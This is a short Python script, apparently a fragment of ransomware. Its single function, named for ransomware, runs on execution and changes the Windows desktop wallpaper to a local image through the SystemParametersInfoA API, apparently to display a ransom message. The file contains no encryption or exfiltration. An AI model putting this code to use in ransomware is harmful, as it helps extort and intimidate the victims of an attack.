#! /usr/bin/env python
#! -*- coding: UTF-8 -*-
import os
import ctypes

def ransomware_change_background():
    drive = os.getcwd()
    image = "background.png"
    image_path = os.path.join(drive, image)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path, 3)

ransomware_change_background()